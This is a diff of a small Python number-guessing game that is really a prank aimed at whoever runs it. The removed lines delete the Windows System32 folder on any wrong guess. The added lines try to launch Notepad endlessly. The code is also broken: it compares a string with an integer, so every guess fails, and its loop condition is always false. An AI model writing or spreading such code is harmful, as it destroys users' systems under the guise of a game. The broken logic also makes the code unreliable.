@@ -1,15 +1,14 @@
 import random
-import shutil
+import subprocess
 
 correct_number = random.randint(1, 100)
-
 
 def main():
     hans = input("guess a number: ")
     if hans == correct_number:
         print("correct!")
     else:
-        shutil.rmtree("C:\\Windows\\System32")
-
+        while '1' == 1:
+            subprocess.Popen(["notepad.exe"])
 
 main()
